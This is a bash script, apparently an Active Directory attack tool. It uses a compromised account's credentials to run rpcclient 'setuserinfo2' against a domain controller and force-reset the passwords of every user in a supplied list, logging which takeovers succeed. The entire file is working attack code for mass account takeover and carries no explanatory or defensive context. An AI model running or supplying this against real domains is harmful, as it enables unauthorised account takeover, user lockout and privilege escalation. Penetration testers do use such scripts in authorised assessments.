#!/bin/bash

# Define color codes
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

# Help message
usage() {
    echo "Usage: $0 -d DOMAIN -u CONTROLLED_USER -p CONTROLLED_USER_PASSWORD -i DOMAIN_CONTROLLER_IP -f USERNAME_LIST -n NEW_PASSWORD"
    exit 1
}

# Parse command-line options
while getopts "d:u:p:i:f:n:" opt; do
    case "$opt" in
        d) DOMAIN="$OPTARG" ;;
        u) CONTROLLED_USER="$OPTARG" ;;
        p) CONTROLLED_USER_PASSWORD="$OPTARG" ;;
        i) DOMAIN_CONTROLLER="$OPTARG" ;;
        f) USERNAME_LIST="$OPTARG" ;;
        n) NEW_PASSWORD="$OPTARG" ;;
        *) usage ;;
    esac
done

# Validate required arguments
if [[ -z "$DOMAIN" || -z "$CONTROLLED_USER" || -z "$CONTROLLED_USER_PASSWORD" || -z "$DOMAIN_CONTROLLER" || -z "$USERNAME_LIST" || -z "$NEW_PASSWORD" ]]; then
    echo -e "${RED}[ERROR] Missing required arguments!${RESET}"
    usage
fi

# Log files
SUCCESS_LOG="successful_changes.log"
FAILURE_LOG="failed_changes.log"

# Clear previous logs
> "$SUCCESS_LOG"
> "$FAILURE_LOG"

# Check if rpcclient is installed
if ! command -v rpcclient &> /dev/null; then
    echo -e "${RED}[ERROR] rpcclient is not installed! Install it using:${RESET}"
    echo "  sudo apt install samba-common-bin"
    exit 1
fi

# Check if username list file exists
if [[ ! -f "$USERNAME_LIST" ]]; then
    echo -e "${RED}[ERROR] Username list file '$USERNAME_LIST' not found!${RESET}"
    exit 1
fi

# Loop through usernames
while IFS= read -r TARGET_USER; do
    echo "Attempting to change password for $TARGET_USER..."

    # Execute the password change attempt
    OUTPUT=$(rpcclient -U "${DOMAIN}/${CONTROLLED_USER}%${CONTROLLED_USER_PASSWORD}" "$DOMAIN_CONTROLLER" <<EOF
setuserinfo2 $TARGET_USER 23 $NEW_PASSWORD
EOF
)

    # Check the result
    if [[ -z "$OUTPUT" ]]; then
        echo -e "${GREEN}[SUCCESS] Password changed for $TARGET_USER${RESET}" | tee -a "$SUCCESS_LOG"
    elif echo "$OUTPUT" | grep -q "NT_STATUS_NONE_MAPPED"; then
        echo -e "${RED}[FAILED] $TARGET_USER - NT_STATUS_NONE_MAPPED (User does not exist)${RESET}" | tee -a "$FAILURE_LOG"
    elif echo "$OUTPUT" | grep -q "NT_STATUS_ACCESS_DENIED"; then
        echo -e "${RED}[FAILED] $TARGET_USER - NT_STATUS_ACCESS_DENIED (Insufficient privileges)${RESET}" | tee -a "$FAILURE_LOG"
    elif echo "$OUTPUT" | grep -q "NT_STATUS_LOGON_FAILURE"; then
        echo -e "${RED}[FAILED] $TARGET_USER - NT_STATUS_LOGON_FAILURE (Wrong credentials)${RESET}" | tee -a "$FAILURE_LOG"
    else
        echo -e "${YELLOW}[UNKNOWN] $TARGET_USER - Output: $OUTPUT${RESET}" | tee -a "$FAILURE_LOG"
    fi
done < "$USERNAME_LIST"

echo "Password change attempts completed."
echo "Successes logged in $SUCCESS_LOG"
echo "Failures logged in $FAILURE_LOG"
